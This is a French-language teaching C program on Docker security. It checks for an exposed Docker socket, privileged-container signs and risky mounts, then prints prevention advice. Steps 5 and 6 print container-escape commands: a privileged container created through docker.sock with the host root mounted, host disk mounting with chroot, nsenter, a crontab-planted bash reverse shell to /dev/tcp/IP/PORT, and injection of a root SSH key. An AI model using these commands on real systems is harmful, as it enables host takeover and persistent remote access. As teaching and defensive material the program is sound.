/*
 * OBJECTIF  : Comprendre les techniques d'exploitation Docker
 * PREREQUIS : Bases C, containers, namespaces, socket Unix
 * COMPILE   : gcc -o example example.c
 *
 * Ce programme demontre les vecteurs d'exploitation Docker :
 * socket Docker exposee, containers privilegies, montages
 * dangereux, et detection des mauvaises configurations.
 * Demonstration pedagogique - pas d'exploitation reelle.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <dirent.h>
#include <errno.h>

/*
 * Etape 1 : Surfaces d'attaque Docker
 */
static void explain_attack_surfaces(void) {
    printf("[*] Etape 1 : Surfaces d'attaque Docker\n\n");

    printf("    ┌──────────────────────────────────────────────┐\n");
    printf("    │         VECTEURS D'ATTAQUE DOCKER            │\n");
    printf("    ├──────────────────────────────────────────────┤\n");
    printf("    │                                              │\n");
    printf("    │  1. Docker Socket exposee                    │\n");
    printf("    │     /var/run/docker.sock accessible          │\n");
    printf("    │     -> Controle total sur le daemon Docker   │\n");
    printf("    │                                              │\n");
    printf("    │  2. Container privileged                     │\n");
    printf("    │     docker run --privileged                  │\n");
    printf("    │     -> Toutes les capabilities + devices     │\n");
    printf("    │                                              │\n");
    printf("    │  3. Montages dangereux                       │\n");
    printf("    │     -v /:/host ou -v /var/run/docker.sock    │\n");
    printf("    │     -> Acces au filesystem hote              │\n");
    printf("    │                                              │\n");
    printf("    │  4. Docker API exposee (TCP 2375/2376)       │\n");
    printf("    │     -> Controle a distance sans auth         │\n");
    printf("    │                                              │\n");
    printf("    │  5. Images malveillantes                     │\n");
    printf("    │     -> Supply chain attack                   │\n");
    printf("    └──────────────────────────────────────────────┘\n\n");
}

/*
 * Etape 2 : Detecter la socket Docker
 */
static void detect_docker_socket(void) {
    printf("[*] Etape 2 : Detection de la socket Docker\n\n");

    const char *socket_paths[] = {
        "/var/run/docker.sock",
        "/run/docker.sock",
        "/var/run/containerd/containerd.sock",
        "/run/containerd/containerd.sock",
        NULL
    };

    for (int i = 0; socket_paths[i]; i++) {
        struct stat st;
        if (stat(socket_paths[i], &st) == 0) {
            printf("    [+] TROUVE : %s\n", socket_paths[i]);
            printf("        Type   : %s\n",
                   S_ISSOCK(st.st_mode) ? "Socket" : "Autre");
            printf("        Perms  : %o\n", st.st_mode & 0777);

            /* Verifier si on peut y acceder */
            if (access(socket_paths[i], R_OK | W_OK) == 0)
                printf("        [!] ACCESSIBLE en lecture/ecriture !\n");
            else
                printf("        [-] Pas accessible (permission refusee)\n");
            printf("\n");
        }
    }

    /* Verifier aussi la variable d'environnement DOCKER_HOST */
    const char *docker_host = getenv("DOCKER_HOST");
    if (docker_host)
        printf("    DOCKER_HOST = %s\n\n", docker_host);
    else
        printf("    DOCKER_HOST non defini\n\n");

    printf("    Si la socket est accessible :\n");
    printf("    curl --unix-socket /var/run/docker.sock http://localhost/version\n");
    printf("    curl --unix-socket /var/run/docker.sock http://localhost/containers/json\n\n");
}

/*
 * Etape 3 : Detecter un container privileged
 */
static void detect_privileged(void) {
    printf("[*] Etape 3 : Detection de container privileged\n\n");

    int is_privileged = 0;

    /* Methode 1 : Verifier les capabilities */
    FILE *fp = fopen("/proc/self/status", "r");
    if (fp) {
        char line[256];
        while (fgets(line, sizeof(line), fp)) {
            if (strncmp(line, "CapEff:", 7) == 0) {
                char *val = line + 7;
                while (*val == ' ' || *val == '\t') val++;
                val[strcspn(val, "\n")] = '\0';
                printf("    CapEff = %s\n", val);
                /* Comparer avec toutes les capabilities */
                if (strstr(val, "000001ffffffffff") ||
                    strstr(val, "0000003fffffffff")) {
                    printf("    [!] TOUTES les capabilities -> PRIVILEGED !\n");
                    is_privileged = 1;
                }
                break;
            }
        }
        fclose(fp);
    }

    /* Methode 2 : Verifier l'acces aux devices */
    struct stat st;
    if (stat("/dev/sda", &st) == 0 || stat("/dev/vda", &st) == 0 ||
        stat("/dev/nvme0n1", &st) == 0) {
        if (access("/dev/sda", R_OK) == 0 ||
            access("/dev/vda", R_OK) == 0) {
            printf("    [!] Acces direct aux disques -> PRIVILEGED\n");
            is_privileged = 1;
        }
    }

    /* Methode 3 : Verifier /proc/sysrq-trigger */
    if (access("/proc/sysrq-trigger", W_OK) == 0) {
        printf("    [!] /proc/sysrq-trigger accessible -> indicateur privileged\n");
        is_privileged = 1;
    }

    /* Methode 4 : Verifier seccomp */
    fp = fopen("/proc/self/status", "r");
    if (fp) {
        char line[256];
        while (fgets(line, sizeof(line), fp)) {
            if (strncmp(line, "Seccomp:", 8) == 0) {
                int seccomp_mode = atoi(line + 8);
                printf("    Seccomp mode = %d (%s)\n", seccomp_mode,
                       seccomp_mode == 0 ? "DESACTIVE" :
                       seccomp_mode == 1 ? "strict" : "filter");
                if (seccomp_mode == 0) {
                    printf("    [!] Seccomp desactive -> possiblement privileged\n");
                    is_privileged = 1;
                }
                break;
            }
        }
        fclose(fp);
    }

    printf("\n    Verdict : %s\n\n",
           is_privileged ? "[!] Container PROBABLEMENT privileged"
                         : "[-] Container probablement non-privileged");
}

/*
 * Etape 4 : Detecter les montages dangereux
 */
static void detect_dangerous_mounts(void) {
    printf("[*] Etape 4 : Montages dangereux\n\n");

    FILE *fp = fopen("/proc/self/mounts", "r");
    if (!fp) {
        printf("    (impossible de lire /proc/self/mounts)\n\n");
        return;
    }

    printf("    Montages a risque :\n");
    char line[1024];
    int dangerous = 0;

    while (fgets(line, sizeof(line), fp)) {
        int risk = 0;
        const char *reason = "";

        if (strstr(line, "docker.sock")) {
            risk = 1;
            reason = "Socket Docker -> controle total";
        } else if (strstr(line, " /host")) {
            risk = 1;
            reason = "Filesystem hote monte";
        } else if (strstr(line, " /etc/shadow")) {
            risk = 1;
            reason = "Fichier de mots de passe hote";
        } else if (strstr(line, " /etc/crontab")) {
            risk = 1;
            reason = "Crontab hote -> execution de code";
        }

        if (risk) {
            line[strcspn(line, "\n")] = '\0';
            if (strlen(line) > 70)
                line[70] = '\0';
            printf("    [!] %s\n        Raison : %s\n\n", line, reason);
            dangerous++;
        }
    }
    fclose(fp);

    if (dangerous == 0)
        printf("    [-] Aucun montage dangereux detecte\n\n");

    /* Verifier si le filesystem racine de l'hote est accessible */
    const char *host_indicators[] = {
        "/host/etc/passwd", "/mnt/host/etc/passwd",
        "/rootfs/etc/passwd", NULL
    };
    for (int i = 0; host_indicators[i]; i++) {
        if (access(host_indicators[i], R_OK) == 0) {
            printf("    [!] Filesystem hote accessible via %s\n\n",
                   host_indicators[i]);
            break;
        }
    }
}

/*
 * Etape 5 : Exploitation via Docker socket (concept)
 */
static void explain_socket_exploitation(void) {
    printf("[*] Etape 5 : Exploitation via socket Docker (concept)\n\n");

    printf("    Si /var/run/docker.sock est accessible :\n\n");

    printf("    1. Lister les containers :\n");
    printf("       curl -s --unix-socket /var/run/docker.sock \\\n");
    printf("         http://localhost/containers/json\n\n");

    printf("    2. Creer un container privileged avec montage root :\n");
    printf("       curl -s --unix-socket /var/run/docker.sock \\\n");
    printf("         -X POST http://localhost/containers/create \\\n");
    printf("         -H 'Content-Type: application/json' \\\n");
    printf("         -d '{\"Image\":\"alpine\",\n");
    printf("              \"Cmd\":[\"/bin/sh\"],\n");
    printf("              \"HostConfig\":{\n");
    printf("                \"Binds\":[\"/:/host\"],\n");
    printf("                \"Privileged\":true\n");
    printf("              }}'\n\n");

    printf("    3. Demarrer et executer un shell :\n");
    printf("       curl --unix-socket /var/run/docker.sock \\\n");
    printf("         -X POST http://localhost/containers/<id>/start\n");
    printf("       -> chroot /host pour acceder a l'hote\n\n");
}

/*
 * Etape 6 : Escape depuis un container privileged (concept)
 */
static void explain_privileged_escape(void) {
    printf("[*] Etape 6 : Escape depuis un container privileged\n\n");

    printf("    Methode 1 : Mount du disque hote\n");
    printf("    ─────────────────────────────────\n");
    printf("    mkdir /mnt/host\n");
    printf("    mount /dev/sda1 /mnt/host\n");
    printf("    chroot /mnt/host /bin/bash\n\n");

    printf("    Methode 2 : nsenter dans les namespaces de PID 1\n");
    printf("    ─────────────────────────────────\n");
    printf("    nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash\n\n");

    printf("    Methode 3 : Injection de crontab\n");
    printf("    ─────────────────────────────────\n");
    printf("    mount /dev/sda1 /mnt\n");
    printf("    echo '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/IP/PORT 0>&1\"'\n");
    printf("    >> /mnt/etc/crontab\n\n");

    printf("    Methode 4 : Ecriture de cle SSH\n");
    printf("    ─────────────────────────────────\n");
    printf("    mount /dev/sda1 /mnt\n");
    printf("    echo 'ssh-rsa AAAA...' >> /mnt/root/.ssh/authorized_keys\n\n");
}

/*
 * Etape 7 : Detection et prevention
 */
static void explain_prevention(void) {
    printf("[*] Etape 7 : Bonnes pratiques de securite Docker\n\n");

    printf("    Prevention  | Commande / Config\n");
    printf("    ────────────|───────────────────────────────────────\n");
    printf("    No root     | docker run --user 1000:1000\n");
    printf("    No priv     | JAMAIS --privileged en production\n");
    printf("    Drop caps   | --cap-drop ALL --cap-add NET_BIND\n");
    printf("    Read-only   | --read-only --tmpfs /tmp\n");
    printf("    No socket   | Ne JAMAIS monter docker.sock\n");
    printf("    Seccomp     | --security-opt seccomp=profile.json\n");
    printf("    AppArmor    | --security-opt apparmor=docker-default\n");
    printf("    No new priv | --security-opt no-new-privileges\n");
    printf("    Resources   | --memory 256m --cpus 0.5\n");
    printf("    Network     | --network none (si pas besoin)\n\n");

    printf("    Outils de scan :\n");
    printf("    - trivy : scan de vulnerabilites d'images\n");
    printf("    - docker bench security : audit de configuration\n");
    printf("    - falco : detection d'activite suspecte runtime\n\n");
}

int main(void) {
    printf("[*] Demo : Docker Exploitation\n\n");

    explain_attack_surfaces();
    detect_docker_socket();
    detect_privileged();
    detect_dangerous_mounts();
    explain_socket_exploitation();
    explain_privileged_escape();
    explain_prevention();

    printf("[+] Demo terminee avec succes\n");
    return 0;
}
